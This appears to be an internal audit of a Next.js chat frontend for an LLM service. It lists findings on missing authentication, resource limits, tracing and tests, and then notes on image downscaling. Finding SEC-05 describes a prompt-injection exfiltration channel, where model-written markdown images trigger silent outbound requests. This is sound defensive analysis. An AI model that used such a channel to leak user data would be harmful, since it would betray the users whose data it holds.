| `SEC-01` | every `app/api/**/route.ts`; [`lib/auth.ts:1-9`](../../frontend/lib/auth.ts#L1-L9); [`lib/proxy.ts`](../../frontend/lib/proxy.ts); [`lib/streams.ts`](../../frontend/lib/streams.ts) | Zero of the ten route handlers performs any authentication or authorization check. Every cookie-forwarding branch (`chat:160-162`, `active:21-23`, `attach:49-52`, `compact:21-23`, `stop:22-24`, `upload:27-29`, `proxy:26-27`/`56-58`) is dead code against an orchestrator that never issues or reads a cookie |
| `SEC-05` | [`Markdown.tsx:55-72`](../../frontend/components/Markdown.tsx#L55-L72) + [`next.config.mjs:2-6`](../../frontend/next.config.mjs#L2-L6); [`lib/pasted.ts:40-48`](../../frontend/lib/pasted.ts#L40-L48) | Model-authored markdown images cause silent outbound HTTP requests with no `img` override and no CSP — the exfiltration channel a prompt injection would use. Pasted/untrusted text is inlined into the prompt with no provenance marker |
| `REL-01` | [`Composer.tsx:42,65,68`](../../frontend/components/Composer.tsx#L42); [`app/api/chat/route.ts:126`](../../frontend/app/api/chat/route.ts#L126); [`lib/proxy.ts:39,60`](../../frontend/lib/proxy.ts#L39); [`lib/attachments.ts:24`](../../frontend/lib/attachments.ts#L24) | The 10/25/200 MB attachment caps are client-side only; `/api/chat` buffers the full JSON body twice (`:126` parse, `:164` re-stringify) with no bound; `lib/proxy.ts` buffers whole request and response bodies; the in-memory attachment Map is never evicted |
| `OBS-01` | [`lib/streams.ts:311,372`](../../frontend/lib/streams.ts#L311); [`lib/historyApi.ts:129`](../../frontend/lib/historyApi.ts#L129); all ten route handlers | No correlation/trace id is generated in the browser or attached to any outbound request, so a failed generation cannot be tied to an orchestrator log line |
| `TEST-01` | repo-wide | No CI exists; nothing enforces `next build`, `next lint` or `vitest` on a change |
| `TEST-02` | [`vitest.config.mts:5-6`](../../frontend/vitest.config.mts#L5-L6) | `include: ['tests/**/*.test.ts']` + `environment: 'node'` make all 32 components (5,618 LOC) structurally untestable; 237 passing tests all target `lib/` |
| `DX-01` | [`package.json`](../../frontend/package.json) + committed `package-lock.json` | Satisfied here — recorded as the counter-example to the orchestrator's unpinned `requirements.txt` |
| `DX-02` | [`app/api/chat/route.ts:134`](../../frontend/app/api/chat/route.ts#L134); [`lib/fixtures.ts`](../../frontend/lib/fixtures.ts); [`lib/mockApi.ts`](../../frontend/lib/mockApi.ts) | `MOCK_MODE=true` silently serves 397 LOC of fabricated engine answers — complete with fake Salesforce record ids and `lightning.force.com` URLs (`fixtures.ts:98-121`, `:259-270`) — and is undocumented in `.env.example` |

**Explicitly not a finding: XSS.** See §3. `Markdown.tsx` uses no `rehype-raw`,
`react-markdown@10.1.0` applies `defaultUrlTransform` with
`safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i`, and `MermaidBlock.tsx:58` sets
`securityLevel: 'strict'` before both `dangerouslySetInnerHTML` sites. The frontend's HTML injection
surface is closed.

## Image downscaling before upload (2026-08-29)

[`lib/images.ts`](../../frontend/lib/images.ts) — `fitWithin(width, height,
maxEdge = MAX_IMAGE_EDGE)` (pure, tested in
[`tests/images.test.ts`](../../frontend/tests/images.test.ts)),
`outputMime(sourceMime)` (PNG stays PNG so screenshot text stays crisp;
JPEG/WebP re-encode as JPEG at 0.92) and `downscaleImageFile(file)`
(`createImageBitmap` + canvas; resolves `null` when the image already fits,
the browser lacks the APIs, or anything throws — the caller then sends the
original bytes). `Composer.handleFile` calls it for images before the base64
step; PDFs are untouched. Attachments are counted as pending while they are
read/downscaled, and `submit()` plus the Send button wait for that count to
reach zero — decoding a 4K screenshot takes tens of milliseconds, long enough
for Ctrl+V-then-Enter to post the message without the image otherwise.
`MAX_IMAGE_EDGE = 1600`: image tokens scale with pixel count, measured on the
served model's `/tokenize` — 1,013 at 1280×800, 1,413 at 1600×900, 3,613 at
2560×1440, 8,173 at 3840×2160 — so the cap cuts a 1440p screenshot 2.6× and a
4K one 5.8×. WebP stays on the PNG path: it is often lossless and carries
alpha, which `toDataURL('image/jpeg')` would composite onto black. The
10 MB / 5-image caps are unchanged and still apply to the file, not the pixels.
